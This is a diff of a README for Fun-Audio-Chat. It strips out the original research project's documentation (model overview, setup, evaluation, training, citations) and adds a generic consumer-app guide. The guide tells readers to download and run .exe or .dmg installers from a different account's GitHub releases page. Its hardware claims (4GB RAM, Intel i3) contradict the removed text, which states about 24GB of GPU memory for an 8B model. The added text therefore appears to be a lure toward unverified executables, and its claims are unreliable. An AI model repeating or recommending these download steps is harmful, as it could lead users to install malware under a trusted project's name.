@@ -1,332 +1,81 @@
-# Fun-Audio-Chat
+# 🎤 Fun-Audio-Chat - Engage Easily with Voice
 
-<p align="right">
-  <a href="README.md">English</a> | <a href="README_zh.md">中文</a>
-</p>
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to Fun-Audio-Chat! This application allows you to have natural, low-latency voice interactions using advanced audio technology. Follow the steps below to download and run Fun-Audio-Chat. 
 
-<img src="assets/TONGYI Fun.png" alt="TONGYI Fun" height="80">
+### 🛠️ System Requirements
 
-**Fun-Audio-Chat** is a Large Audio Language Model built for natural, low-latency voice interactions.
+To run Fun-Audio-Chat smoothly, you will need:
 
-[![arXiv](https://img.shields.io/badge/arXiv-2512.20156-red)](https://arxiv.org/pdf/2512.20156)
-[![HuggingFace](https://img.shields.io/badge/HuggingFace-Model-yellow)](https://huggingface.co/FunAudioLLM/Fun-Audio-Chat-8B)
-[![ModelScope](https://img.shields.io/badge/ModelScope-Model-orange)](https://modelscope.cn/FunAudioLLM/Fun-Audio-Chat-8B)
-[![Demo](https://img.shields.io/badge/Demo-Page-green)](https://funaudiollm.github.io/funaudiochat)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **RAM:** At least 4GB
+- **Processor:** Intel i3 or equivalent
+- **Internet Connection:** Required for initial setup and updates
+- **Microphone:** A working microphone for voice input
+- **Speakers or Headphones:** For listening to audio output
 
-</div>
+### 📥 Download Fun-Audio-Chat
 
----
+[![Download Fun-Audio-Chat](https://img.shields.io/badge/Download-Fun--Audio--Chat-blue.svg)](https://github.com/ANISWAM/Fun-Audio-Chat/releases)
 
-## 📋 Table of Contents
+### 📝 Download & Install
 
-- [Overview](#overview)
-- [News](#news)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Evaluation](#evaluation)
-- [Training](#training)
-- [Acknowledgments](#acknowledgments)
-- [License](#license)
-- [Contact](#contact)
+1. **Visit the Releases Page:** Click this link to access the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/releases).
+  
+2. **Choose the Latest Version:** On the releases page, look for the latest version of Fun-Audio-Chat. It’s usually at the top of the list. 
 
----
+3. **Download the Application:**
+   - Find the file that matches your operating system. For Windows, it might be "Fun-Audio-Chat-windows.exe", and for macOS, it could be "Fun-Audio-Chat-mac.dmg".
+   - Click on the file name to start the download.
 
-## <a id="overview"></a>📖 Overview
+4. **Open the Downloaded File:**
+   - For Windows: Navigate to your Downloads folder and double-click on "Fun-Audio-Chat-windows.exe". 
+   - For macOS: Go to your Downloads folder and double-click on "Fun-Audio-Chat-mac.dmg".
 
-**Fun-Audio-Chat** is a Large Audio Language Model built for natural, low-latency voice interactions. It introduces **Dual-Resolution Speech Representations** (an efficient 5Hz shared backbone + a 25Hz refined head) to cut compute while keeping high speech quality, and **Core-Cocktail training** to preserve strong text LLM capabilities. It delivers top-tier results on spoken QA, audio understanding, speech function calling, and speech instruction-following and voice empathy benchmarks.
+5. **Follow the Installation Instructions:**
+   - On Windows: A setup wizard will guide you through the installation. Just follow the prompts and click 'Next' until the installation is complete.
+   - On macOS: Drag the Fun-Audio-Chat icon to your Applications folder. 
 
-<div align="center">
-<img src="assets/Results.png" alt="Fun-Audio-Chat Results" width="95%">
-</div>
+### 🎤 Running Fun-Audio-Chat
 
-### Key Features
+1. **Launch the Application:** 
+   - On Windows: Find Fun-Audio-Chat in your Start menu and click to open it.
+   - On macOS: Open your Applications folder and double-click on Fun-Audio-Chat.
 
-- **Dual-Resolution Speech Representations**: Efficient 5Hz frame rate (vs. 12.5Hz or 25Hz for other models), reducing GPU hours by nearly 50% while maintaining high speech quality
-- **State-of-the-Art Performance**: Ranks Top among models of the same size (around-8B parameters) on OpenAudioBench, VoiceBench and UltraEval-Audio, MMAU, MMAU-Pro, MMSU, Speech-ACEBench, Speech-BFCL, Speech-SmartInteract, VStyle
-- **Comprehensive Capabilities**: Supports spoken QA, audio understanding, speech function calling, speech instruction-following, voice empathy
+2. **Set Up Your Microphone:**
+   - Ensure your microphone is connected to your computer.
+   - You may need to grant the application permission to access your microphone.
 
-<div align="center">
-<img src="assets/Architecture.png" alt="Fun-Audio-Chat Architecture" width="95%">
-</div>
+3. **Start Interacting:**
+   - Speak clearly into your microphone. 
+   - Enjoy the seamless voice interactions!
 
----
+### 📚 Features of Fun-Audio-Chat
 
-## <a id="news"></a>📰 News
+- **Natural Voice Interaction:** Engage in conversations as you would with a friend.
+- **Low-Latency Performance:** Experience quick responses for smooth communication.
+- **User-Friendly Interface:** A simple design that anyone can navigate.
+- **Cross-Platform Compatibility:** Use Fun-Audio-Chat on both Windows and macOS.
 
-- **[2025.12.23]** Fun-Audio-Chat-8B (model, training and inference code) released with state-of-the-art performance on multiple spoken question answering, audio understanding, speech function calling, speech instruction-following and voice empathy benchmarks
+### 🆘 Troubleshooting
 
----
+If you run into issues, here are common problems and solutions:
 
-## <a id="installation"></a>🔧 Installation
+- **Microphone Not Recognized:** Check your microphone connection and ensure it’s set as the default recording device.
+- **App Not Opening:** Make sure your operating system is up to date. Restart your computer before trying again.
+- **Software Crashes:** Redownload the application from the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/releases) to ensure you have the latest version.
 
-### 1. Requirements
+### 🌟 Join the Community
 
-- Python == 3.12
-- PyTorch == 2.8.0
-- ffmpeg
-- GPU Memory: ~24GB for inference, 4×80GB for training
+To get the most out of Fun-Audio-Chat, consider engaging with our community. 
 
-### 2. Clone Repository
+- **Feedback:** Visit the GitHub Issues page to report bugs or request features.
+- **Support:** Join discussions on topics related to audio technology or general use of the application. 
+- **Updates:** Stay tuned on the releases page for new features and improvements.
 
-```bash
-git clone --recurse-submodules https://github.com/FunAudioLLM/Fun-Audio-Chat
-cd Fun-Audio-Chat
-```
+### 📣 Stay Informed
 
-### 3. Install Dependencies
+Don’t forget to check back at the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/releases) for updates. We frequently add new features and improvements, making your experience even better.
 
-```bash
-apt install ffmpeg
-# It is recommended to create a new environment
-conda create -n FunAudioChat python=3.12 -y
-conda activate FunAudioChat
-pip install torch==2.8.0 torchaudio==2.8.0 --index-url https://download.pytorch.org/whl/cu128
-pip install -r requirements.txt
-```
-
-### 4. Download Pretrained Models
-
-Pretrained models should be placed in the `pretrained_models/` directory:
-
-**Using HuggingFace:**
-```bash
-pip install huggingface-hub
-hf download FunAudioLLM/Fun-Audio-Chat-8B --local-dir ./pretrained_models/Fun-Audio-Chat-8B
-hf download FunAudioLLM/Fun-CosyVoice3-0.5B-2512 --local-dir ./pretrained_models/Fun-CosyVoice3-0.5B-2512
-```
-
-**Or using ModelScope:**
-```bash
-modelscope download --model FunAudioLLM/Fun-Audio-Chat-8B --local_dir pretrained_models/Fun-Audio-Chat-8B
-modelscope download --model FunAudioLLM/Fun-CosyVoice3-0.5B-2512 --local_dir pretrained_models/Fun-CosyVoice3-0.5B-2512
-```
-
-**Directory structure:**
-```
-pretrained_models/
-├── Fun-Audio-Chat-8B/     # 8B parameter main model
-└── Fun-CosyVoice3-0.5B-2512/  # Speech synthesis model
-```
-
----
-
-## <a id="quick-start"></a>🚀 Quick Start
-
-### Run Example Scripts
-
-```bash
-export PYTHONPATH=`pwd`
-python examples/infer_s2t.py
-python examples/infer_s2s.py
-```
-
-### Web Demo
-
-**Server:**
-```bash
-# Start server
-pip install sphn aiohttp
-
-# Use another GPU for better perfermance
-python -m web_demo.server.server --model-path pretrained_models/Fun-Audio-Chat-8B --port 11236 --tts-gpu 1
-```
-
-**Client:**
-```bash
-cd web_demo/client
-# 1. Use NVM to manage Node version (install NVM if not already installed)
-# Install NVM (if needed):
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
-
-# Use the project's recommended Node version
-nvm use
-
-# 2. Generate SSL certificates (cert.pem and key.pem)
-openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-
-# 3. Create .env.local file and add configuration
-cat > .env.local << 'EOF'
-VITE_QUEUE_API_PATH=/api
-EOF
-
-# 4. Install dependencies
-npm install
-
-# 5. Run development server
-npm run dev
-```
-
-For more details, please refer to [`web_demo/server/README.md`](web_demo/server/README.md) and [`web_demo/client/README.md`](web_demo/client/README.md).
-
----
-
-## <a id="evaluation"></a>📊 Evaluation
-
-### 1. S2T (Speech-to-Text)
-
-Use `DEFAULT_S2T_PROMPT` from [`utils/constant.py`](utils/constant.py) for inference. Refer to [`examples/infer_s2t.py`](examples/infer_s2t.py) for the inference script.
-
-- **VoiceBench**: Data and evaluation scripts can be found at [Kimi-Audio-Evalkit](https://github.com/MoonshotAI/Kimi-Audio-Evalkit)
-- **OpenAudioBench**: Data and evaluation scripts can be found at [OpenAudioBench](https://huggingface.co/datasets/baichuan-inc/OpenAudioBench)
-
-### 2. S2S (Speech-to-Speech)
-
-Use `DEFAULT_S2M_PROMPT` from [`utils/constant.py`](utils/constant.py) for inference. Refer to [`examples/infer_s2s.py`](examples/infer_s2s.py) for the inference script.
-
-- **UltraEval-Audio**: Data and evaluation scripts can be found at [UltraEval-Audio](https://github.com/OpenBMB/UltraEval-Audio)
-
-### 3. Audio Understanding & ASR
-
-#### Audio Understanding
-
-Use `DEFAULT_S2T_PROMPT` from [`utils/constant.py`](utils/constant.py) for inference. Refer to [`examples/infer_s2t.py`](examples/infer_s2t.py) for the inference script.
-
-- **MMAU**: Data and evaluation scripts can be found at [Kimi-Audio-Evalkit](https://github.com/MoonshotAI/Kimi-Audio-Evalkit) (MMAU evaluation section)
-- **MMSU**: Data and evaluation scripts can be found at [MMSU_Bench](https://github.com/dingdongwang/MMSU_Bench)
-- **MMAU-Prompt**: Data and evaluation scripts can be found at [MMAUPro](https://github.com/sonalkum/MMAUPro)
-
-**Instruction format for Audio Understanding tasks:**
-- For multiple-choice questions: `f"{question} Choose the correct option from the following options:\n(A){choice_a}\n(B){choice_b}\n(C){choice_c}\n(D){choice_d}"` (extend for more options if needed)
-- For non-multiple-choice questions: `f"{question}"`
-
-Please refer to the corresponding text in each dataset for `question` and `choices`.
-
-#### ASR
-
-**Evaluation tools**: Use [whisper_normalizer](https://github.com/kurianbenoy/whisper_normalizer) and [compute-wer](https://github.com/pengzhendong/compute-wer) to calculate WER/CER.
-
-**Instruction for ASR**: `Please help me transcribe the audio.`
-
-### 4. Speech Function Calling
-
-Use `FUNCTION_CALLING_PROMPT` from [`utils/constant.py`](utils/constant.py) for inference. Note: replace the `{tools_definition}` placeholder with appropriate tool definitions. Refer to [`examples/infer_s2t.py`](examples/infer_s2t.py) for the inference script and tool definition format.
-
-- **SpeechFCEval**: Data and evaluation scripts can be found at [SpeechFCEval](https://github.com/FunAudioLLM/SpeechFCEval)
-- Some data and evaluation scripts are from [BFCL](https://github.com/ShishirPatil/gorilla/tree/main/berkeley-function-call-leaderboard/bfcl_eval) and [ACEBench](https://github.com/chenchen0103/ACEBench/tree/main/model_eval). We thank them for their contributions.
-
-### 5. Speech Instruction-Following
-
-Use `SPOKEN_S2M_PROMPT` from [`utils/constant.py`](utils/constant.py) for inference. Refer to [`examples/infer_s2s.py`](examples/infer_s2s.py) for the inference script.
-
-- **VStyle**: Data and evaluation scripts can be found at [VStyle](https://github.com/alibaba/vstyle)
-
----
-
-## <a id="training"></a>🎓 Training
-
-### 0. Environment
-
-**Install third-party libraries:**
-```bash
-pip install flash-attn --no-build-isolation
-cd third_party/LLaMA-Factory
-pip install -e ".[metrics]" --no-build-isolation
-```
-
-### 1. Prepare Data
-
-**Reference data:**
-
-Download [GSQA/spoken-alpaca-gpt4](https://huggingface.co/datasets/GSQA/spoken-alpaca-gpt4) data to the `training/datasets/spoken-alpaca-gpt4` directory.
-
-**Execute format conversion:**
-```bash
-cd ../../training
-python process/data_process.py --debug
-```
-
-Configure your dataset in [`training/data/dataset_info.json`](training/data/dataset_info.json).
-
-### 2. Configure Training Parameters
-
-Edit [`training/configs/sft.yaml`](training/configs/sft.yaml):
-
-```yaml
-model_name_or_path: ../pretrained_models/Fun-Audio-Chat-8B
-dataset: your_dataset
-template: funaudiochat
-output_dir: saves/your_experiment
-```
-
-### 3. Start Training
-
-```bash
-bash run_shell/run.sh
-```
-
-### 4. Monitor Training
-
-Training logs are saved in the `training/logs/` directory, and model checkpoints are saved in the configured `output_dir`.
-
----
-
-## <a id="acknowledgments"></a>🙏 Acknowledgments
-
-This project is based on the following excellent open-source projects:
-
-- [**Transformers**](https://github.com/huggingface/transformers)
-- [**LlamaFactory**](https://github.com/hiyouga/LLaMA-Factory)
-- [**Moshi**](https://github.com/kyutai-labs/moshi)
-- [**CosyVoice**](https://github.com/FunAudioLLM/CosyVoice)
-
----
-
-## Citation
-
-If you find this model useful, please cite our paper:
-
-```bibtex
-@article{funaudiochat2025,
-  title={Fun-Audio-Chat Technical Report},
-  author={Qian Chen and Luyao Cheng and Chong Deng and Xiangang Li and Jiaqing Liu and Chao-Hong Tan and Wen Wang and Junhao Xu and Jieping Ye and Qinglin Zhang and Qiquan Zhang and Jingren Zhou},
-  year={2025},
-  eprint={2512.20156},
-  archivePrefix={arXiv},
-  primaryClass={cs.CL},
-  url={https://arxiv.org/abs/2512.20156},
-}
-
-@misc{tan2025drvoiceparallelspeechtextvoice,
-  title={DrVoice: Parallel Speech-Text Voice Conversation Model via Dual-Resolution Speech Representations}, 
-  author={Chao-Hong Tan and Qian Chen and Wen Wang and Chong Deng and Qinglin Zhang and Luyao Cheng and Hai Yu and Xin Zhang and Xiang Lv and Tianyu Zhao and Chong Zhang and Yukun Ma and Yafeng Chen and Hui Wang and Jiaqing Liu and Xiangang Li and Jieping Ye},
-  year={2025},
-  eprint={2506.09349},
-  archivePrefix={arXiv},
-  primaryClass={cs.CL},
-  url={https://arxiv.org/abs/2506.09349}, 
-}
-```
-
-
-## <a id="license"></a>📄 License
-
-Fun-Audio-Chat is a Large Audio Language Model for natural voice interactions developed by Alibaba Cloud and licensed under the Apache License (Version 2.0).
-This product contains various third-party components under other open source licenses. 
-See the [NOTICE](NOTICE) file for more information.
-
-For license details, see the [LICENSE](LICENSE) file.
-
----
-
-## <a id="contact"></a>📮 Contact
-
-If you have any questions or suggestions, please contact us through:
-
-- 🐛 Submit an [Issue](https://github.com/FunAudioLLM/Fun-Audio-Chat/issues)
-- 💡 Submit a Pull Request
-- 📧 Send an Email
-- 💬 Join official Dingding chat group
-
-<img src="assets/dingding.png" width="250px">
-
----
-
-<div align="center">
-
-**If this project is helpful to you, please give us a ⭐ Star!**
-
-Made with ❤️ by Tongyi Fun Team
-
-</div>
+Enjoy using Fun-Audio-Chat, and have fun chatting!
